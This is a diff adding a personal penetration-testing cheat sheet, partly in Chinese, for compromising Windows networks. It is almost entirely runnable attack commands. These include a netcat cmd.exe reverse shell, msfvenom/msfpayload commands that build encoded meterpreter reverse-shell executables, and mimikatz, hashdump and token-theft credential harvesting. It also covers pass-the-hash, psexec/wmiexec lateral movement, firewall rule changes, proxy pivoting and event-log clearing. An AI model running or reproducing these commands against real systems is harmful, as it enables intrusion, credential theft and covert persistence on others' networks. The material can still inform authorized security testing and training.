@@ -1,0 +1,299 @@
+
+netsh interface portproxy add v4tov4 listenaddress=192.168.2.111 listenport=2289 connectaddress=192.168.2.129 connectport=22    
+netsh interface portproxy delete v4tov4 listenaddress=192.168.2.111 listenport=2289
+			need  Administrator pri.
+
+
+-----------------------------------------------------------
+nc.exe -e cmd.exe 192.168.2.129 123
+nc.exe -l -p 123
+
+nc －vv -l -p port > path\file.txt
+
+--------------------------------------------------
+lcx -tran lport rhost rport
+
+--------------------------------------
+
+net group "Domain Admins" /domain
+net group "domain controlers" /domain
+net group "domain computers" /domain
+net group "domian users" /domain
+
+
+--------------------------------------------------------------------------------
+msfvenom -p windows/meterpreter/reverse_http -e x86/shikata_ga_nai -i 3 -b '\x00' LHOST=192.168.2.111 LPORT=8081 -f exe >test.exe
+
+
+
+
+msfconsole
+
+use exploit/multi/handler
+
+set payload windows/meterpreter/reverse_http
+set LHOST 192.168.2.129
+set LPORT 80
+exploit 
+
+
+
+bgkill
+bglist
+
+
+load mimikatz
+msv
+kerberos
+
+
+load mimikatz
+		-f privilege::debug
+		-f crypto::list
+		-f crypto::listCertificates
+	    -f crypto::patchcapi
+	    -f crypto::exportCertificates
+
+run credcollect
+run domain_list_gen
+
+
+
+
+hashdump
+
+
+
+
+
+
+portfwd add -l 5555 -p 3389 -r 192.168.211.132   
+rdesktop -u Administrator -p 123qwe 127.0.0.1:5555	
+
+
+
+ use priv
+ getsystem
+
+
+
+migrate 3912----explore pid
+
+
+run  checkvm
+run enum_firefox
+run enum_chrome
+run enum_logged_on_users
+
+download C:\\a.docx /root/Desktop
+upload /root/Desktop/a.exe C:\\temp\\a.exe
+
+portfwd -a -L 127.0.0.1 -l 888 -h 7.6.5.4 -p 5631
+
+cleanev
+-------------------------------------------
+
+
+
+
+
+-----------------------------------------------------------------------
+
+net use 			
+
+
+use windows/smb/psexec
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.2.111
+set LPORT 443
+set RHOST 192.168.2.153
+set 
+
+
+
+
+
+----------------------------------------------------------------
+
+
+pkgmgr /iu:"TFTP" /quiet		------------>  install tftp  win7 
+pkgmgr /up:"TFTP" /quiet		------------>  unstall tftp  win7 
+
+tftp -i 192.168.2.120 get a.exe     download
+tftp -i 192.168.2.120 put a.exe     upload
+
+
+
+use scanner/http/webdav_scanner
+
+
+----------------
+load db_autopwn
+
+db_namp
+db_sqlmap 
+
+db_auto -t -p -e 
+
+
+------------------------
+/usr/share/metasploit......
+
+
+
+
+
+-------------------------------------
+
+netsh firewall set portopening TCP 445 ENABLE 
+netsh firewall set portopening TCP 135 ENABLE 
+netsh firewall delete portopening protocol=TCP port=445
+
+
+
+
+netsh advfirewall firewall add rule name=smb445 dir=in action=allow protocol=TCP localport=445
+netsh advfirewall firewall add rule name=smb445 dir=out action=allow protocol=TCP localport=445
+netsh advfirewall firewall add rule name=smb135 dir=in action=allow protocol=TCP localport=135
+netsh advfirewall firewall add rule name=smb135 dir=out action=allow protocol=TCP localport=135
+
+net use \\192.168.2.151\ipc$ /user:admin password 
+net use \\192.168.2.151\ipc$ /del
+copy \path\srv.exe \\IP\C$\windows\a.exe
+net time \\192.168.2.151
+at \\192.168.2.151 11:05 srv.exe 
+
+
+
+psexec \\ip -u username -p password  cmd
+
+cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1 username password
+cscript.exe wmiexec.vbs /cmd 192.168.1.1 username password "command"
+-----------------------------------
+
+wce.exe -s username:ip:LM-HASH:NT-HASH
+
+
+------------------------获取证书-----
+crypto::capi
+crypto::certificates /export
+
+
+delete  dhcp service 
+
+
+
+反弹的shell,这里介绍两种payload：
+Windows/meterpreter/reverse_tcp
+Windows/meterpreter/reverse_https  windows/meterpreter/reverse_http
+生成反弹后门：
+msfpayload windows/meterpreter/reverse_tcp lhost=192.168.1.1 lport=443 R | \msfencode –b ‘’ -t exe -o root/Desktop/sx.exe
+msfpayload windows/meterpreter/reverse_tcp LHOST=202.96.1.135 LPORT=443 R | msfencode -e x86/shikata_ga_nai -c 5 -t exe >  /root/Share/msf.exe
+设置监听：
+msf > use exploit/multi/handler
+msf  exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf  exploit(handler) > set LHOST 183.11.80.233
+msf  exploit(handler) > set LPORT 443
+msf  exploit(handler) > exploit
+迁移到稳定进程：
+ps    //查看主机进程PID
+migrate PID   //迁移到指定的进程ID
+假冒主机已登录用户：
+use incognito         //加载incognito功能（用来盗窃目标主机的令牌或假冒用户）
+list_tokens -u          //列出目标主机用户的可用令牌
+list_tokens -g          //列出目标主机用户组的可用令牌
+impersonate_token DOMAIN_NAME\\USERNAME       //假冒目标主机上的可用令牌
+steal_token PID      //盗窃给定进程的可用令牌并进行令牌假冒
+drop_token             //冒当前令牌
+
+
+查看网段：
+ifconfig
+查看域控：
+meterpreter > run post/windows/gather/enum_domain
+[+] FOUND Domain: dis9 （域）
+[+] FOUND Domain Controller: dis9team-Domain (IP: 1.1.1.10) （域控IP）
+查看网络接口：
+
+meterpreter > route
+meterpreter > run get_local_subnets
+(meterpreter > background 后台运行SESSION)
+添加路由至本地：
+msf  exploit(handler) > route add 192.168.15.0 255.255.255.0 1 (1为SESSION ID)
+msf  exploit(handler) > route print (列出路由)
+开SOCKS代理：
+msf  exploit(handler) > use auxiliary/server/socks4a
+msf  auxiliary(socks4a) > exploit
+使用Proxychains连接代理：
+编辑proxychains.conf：sudo gedit /etc/proxychains.conf
+连接代理：proxychains nc -vv 192.168.15.100 445
+代理使用NMAP：
+proxychains nmap -sT -Pn 192.168.1.108
+在这里便可以看到nmap已经正常运行了. 在这里如果不加-sT 参数 或者是用 其他扫描方式便会出错 比如-sS etc.话说这个问题困扰了我很长时间,google了一番之后发现
+
+Proxychains allows TCPand DNS tunneling through proxies. Be aware that Proxychains only tunnels TCPand DNS; in other words, avoid using UDP and host discovering through ICMP(ping).
+在这里运行nmap之前可以先扫扫c段中的tcp空连接,然后就可以使用nmap进行tcp空链接扫描.这样便可以进行伪装工作,模块是这个.(具体用法请show options 或info)
+auxiliary/scanner/ip/ipidseq
+然后nmap中使用 -sI 参数选择空闲主机
+nmap -sT -Pn -A -sI 192.168.1.101 192.168.1.108
+-sT tcp扫描,-Pn 不进行ping,-A 显示更详细的信息.-sI 指定空闲主机
+//////////////////////////////////////////////////////////////
+获取HASH模块：
+use ost/windows/manage/netlm_downgrade （多用户可用incognito切换用户来获取不同用户的HASH）
+msf post(netlm_downgrade)  >  set session 1
+msf post(netlm_downgrade)  >  set SMBHOST 192.168.1.2
+msf post(netlm_downgrade)  >  run
+||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+use post/windows/gather/hashdump（可获取全部用户hash）
+msf post(hashdump)  >  set SESSION 1
+msf post(hashdump)  >  exploit
+msf post(hashdump)  >  creds（查看保存在数据库里面的hash）
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+metaspliot常见探测服务模块：
+
+端口扫描
+auxiliary/scanner/portscan
+scanner/portscan/ack        ACK防火墙扫描
+scanner/portscan/ftpbounce  FTP跳端口扫描
+scanner/portscan/syn        SYN端口扫描
+scanner/portscan/tcp        TCP端口扫描
+scanner/portscan/xmas       TCP"XMas"端口扫描
+smb扫描
+smb枚举auxiliary/scanner/smb/smb_enumusers
+返回DCERPC信息auxiliary/scanner/smb/pipe_dcerpc_auditor
+扫描SMB2协议auxiliary/scanner/smb/smb2
+扫描smb共享文件auxiliary/scanner/smb/smb_enumshares
+枚举系统上的用户auxiliary/scanner/smb/smb_enumusers
+SMB登录auxiliary/scanner/smb/smb_login
+SMB登录use windows/smb/psexec
+扫描组的用户auxiliary/scanner/smb/smb_lookupsid
+扫描系统版本auxiliary/scanner/smb/smb_version
+mssql扫描(端口tcp1433udp1434)
+admin/mssql/mssql_enum     MSSQL枚举
+admin/mssql/mssql_exec     MSSQL执行命令
+admin/mssql/mssql_sql      MSSQL查询
+scanner/mssql/mssql_login  MSSQL登陆工具
+scanner/mssql/mssql_ping   测试MSSQL的存在和信息
+另外还有一个mssql_payload的模块 利用使用的
+smtp扫描
+smtp枚举auxiliary/scanner/smtp/smtp_enum 
+扫描smtp版本auxiliary/scanner/smtp/smtp_version
+snmp扫描
+通过snmp扫描设备auxiliary/scanner/snmp/community
+ssh扫描
+ssh登录auxiliary/scanner/ssh/ssh_login
+ssh公共密钥认证登录auxiliary/scanner/ssh/ssh_login_pubkey
+扫描ssh版本测试auxiliary/scanner/ssh/ssh_version
+telnet扫描
+telnet登录auxiliary/scanner/telnet/telnet_login 
+扫描telnet版本auxiliary/scanner/telnet/telnet_version
+tftp扫描
+扫描tftp的文件auxiliary/scanner/tftp/tftpbrute
+ftp版本扫描scanner/ftp/anonymous
+ARP扫描
+auxiliary/scanner/discovery/arp_sweep
+扫描UDP服务的主机auxiliary/scanner/discovery/udp_probe
+检测常用的UDP服务auxiliary/scanner/discovery/udp_sweep
+sniffer密码auxiliary/sniffer/psnuffle
+snmp扫描scanner/snmp/community
+vnc扫描无认证扫描scanner/vnc/vnc_none_auth
